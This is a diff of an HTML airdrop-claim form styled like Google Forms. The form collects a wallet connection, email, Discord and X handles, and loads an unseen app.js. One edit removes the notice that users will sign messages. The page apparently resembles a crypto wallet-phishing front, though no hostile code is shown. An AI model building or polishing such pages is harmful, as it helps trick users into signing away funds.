@@ -25,46 +25,42 @@ input[type="text"], input[type="email"], textarea {
 input:focus, textarea:focus { border-bottom:2px solid #673ab7; }
 textarea { resize:vertical; min-height:80px; }
 
-/* Wallet Button - Google Forms Purple Theme */
+/* Wallet Button */
 .wallet-btn {
-    background:white; color:#000000; border:2px solid #000000; border-radius:6px;
+    background:white; color:#131313; border:2px solid #121212; border-radius:6px;
     padding:12px 28px; cursor:pointer; font-size:16px; font-weight:600;
     transition:all 0.3s ease; letter-spacing:0.3px;
 }
-.wallet-btn:hover { background:#686869; color:white; }
-.wallet-btn.connected {
-    background:#1a73e8 !important; color:white !important; border-color:#1a73e8 !important;
-}
+.wallet-btn:hover { background:#2e2e2e; color:white; }
+.wallet-btn.connected { background:#1a73e8 !important; color:white !important; border-color:#1a73e8 !important; }
+.wallet-btn:disabled { opacity:0.7; cursor:not-allowed; }
+
 .wallet-address {
     margin-top:15px; color:#202124; font-size:15px; word-break:break-word;
     padding:12px 16px; background:#f8f9fa; border-radius:6px; border-left:4px solid #34a853;
     display:none;
 }
 .wallet-address.visible { display:block; }
+
 .status {
     margin-top:12px; font-size:14px; color:#5f6368; padding:8px 0;
     min-height:24px; transition:color 0.3s ease;
 }
 .status.success { color:#34a853; font-weight:500; }
 .status.error { color:#d93025; }
-.status.loading { color:#1a73e8; }
 
-/* Form Cards - Google Forms style detail */
-.form-card .help-text {
-    font-size:12px; color:#5f6368; margin-top:4px;
-}
-
+/* Submit Area */
 .submit-area {
     display:flex; justify-content:space-between; align-items:center;
     background:white; border-radius:10px; padding:20px 30px;
     box-shadow:0 1px 3px rgba(0,0,0,0.1);
 }
 .submit-btn {
-    background:#868686; color:rgb(61, 61, 61); border:none; padding:12px 30px;
+    background:#b1b1b1; color:rgb(68, 68, 68); border:none; padding:12px 30px;
     border-radius:5px; font-size:16px; font-weight:500; cursor:pointer;
     transition:background 0.3s ease;
 }
-.submit-btn:hover { background:#5e35b1; }
+.submit-btn:hover { background:#5d5d5d; }
 .submit-btn:disabled { background:#a7a7a7; color:#666; cursor:not-allowed; }
 .clear-btn {
     color:#673ab7; text-decoration:none; font-weight:500; font-size:14px;
@@ -76,16 +72,6 @@ textarea { resize:vertical; min-height:80px; }
     padding:20px;
 }
 
-/* Loading spinner for wallet connection */
-.spinner {
-    display:inline-block; width:16px; height:16px;
-    border:2px solid rgba(103,58,183,0.2); border-top:2px solid #191919;
-    border-radius:50%; animation:spin 0.8s linear infinite; margin-right:8px;
-    vertical-align:middle;
-}
-@keyframes spin { to { transform:rotate(360deg); } }
-
-/* Responsive */
 @media (max-width:600px) {
     body { padding:12px; }
     .header-content h1 { font-size:1.5rem; }
@@ -109,11 +95,11 @@ textarea { resize:vertical; min-height:80px; }
     </div>
 
     <form id="airdropForm">
-        <!-- Wallet Connection - First step -->
+        <!-- Wallet Connection -->
         <div class="form-card">
             <label>Connect Wallet <span class="required">*</span></label>
             <p style="color:#5f6368; font-size:14px; margin-bottom:12px;">
-                Connect your wallet to verify ownership. You will be asked to sign messages for verification.
+                Connect your wallet to verify your eligibility for the airdrop claim.
             </p>
             <button type="button" id="connectWalletBtn" class="wallet-btn">Connect Wallet</button>
             <div id="walletAddress" class="wallet-address"></div>
@@ -124,32 +110,28 @@ textarea { resize:vertical; min-height:80px; }
         <div class="form-card">
             <label>Email <span class="required">*</span></label>
             <input type="email" id="email" placeholder="Your email" required autocomplete="email">
-            <div class="help-text">We'll never share your email with anyone else.</div>
         </div>
 
         <!-- Discord -->
         <div class="form-card">
             <label>Discord Username <span class="required">*</span></label>
             <input type="text" id="discord" placeholder="Your answer" required>
-            <div class="help-text">e.g. username#1234</div>
         </div>
 
         <!-- X (Twitter) -->
         <div class="form-card">
             <label>X (Twitter) Handle <span class="required">*</span></label>
             <input type="text" id="twitter" placeholder="@username" required>
-            <div class="help-text">Your X profile handle starting with @</div>
         </div>
 
         <!-- Complaint -->
         <div class="form-card">
             <label>Complaint / Description <span class="required">*</span></label>
             <textarea id="complaint" rows="5" placeholder="Your answer" required></textarea>
-            <div class="help-text">Describe your issue in detail</div>
         </div>
 
         <div class="submit-area">
-            <button type="submit" class="submit-btn" id="submitBtn">Submit</button>
+            <button type="submit" class="submit-btn">Submit</button>
             <a href="#" class="clear-btn">Clear form</a>
         </div>
     </form>
@@ -161,12 +143,7 @@ textarea { resize:vertical; min-height:80px; }
     </div>
 </div>
 
-<!-- Load ethers.js -->
-<script src="https://cdn.ethers.io/lib/ethers-6.13.0.umd.min.js">
-    console.log("ethers loaded");
-</script>
-
-<!-- Load app.js -->
+<script src="https://cdn.ethers.io/lib/ethers-6.13.0.umd.min.js"></script>
 <script src="app.js"></script>
 
 </body>
